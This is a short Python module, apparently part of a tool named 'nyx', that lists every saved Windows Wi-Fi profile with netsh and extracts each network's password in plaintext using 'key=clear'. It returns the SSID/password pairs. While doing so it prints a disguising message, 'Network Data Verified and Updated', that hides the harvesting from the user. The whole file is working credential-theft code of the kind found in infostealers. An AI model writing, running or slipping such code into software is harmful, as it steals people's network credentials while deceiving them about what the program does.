# nyx/modules/wifi_credentials.py
import subprocess
from nyx.utils import logger

def get_wifi_credentials():
    wifi_passwords = []
    try:
        profiles = subprocess.check_output(["netsh", "wlan", "show", "profiles"], encoding="utf-8").splitlines()
        for line in profiles:
            if "All User Profile" in line:
                ssid = line.split(":")[1].strip()
                try:
                    profile_info = subprocess.check_output(["netsh", "wlan", "show", "profile", ssid, "key=clear"], encoding="utf-8").splitlines()
                    for info in profile_info:
                        if "Key Content" in info:
                            password = info.split(":")[1].strip()
                            wifi_passwords.append({"SSID": ssid, "Password": password})
                except subprocess.CalledProcessError:
                    continue
        display_message("✅ Network Data Verified and Updated.")
        return wifi_passwords
    except Exception as e:
        display_message(f"❌ Error Updating Network Data: {e}", "error")
        return []

def display_message(message, level="info"):
    if level == "info":
        print(f"[+] {message}")
    elif level == "warning":
        print(f"[!] {message}")
    elif level == "error":
        print(f"[-] {message}")
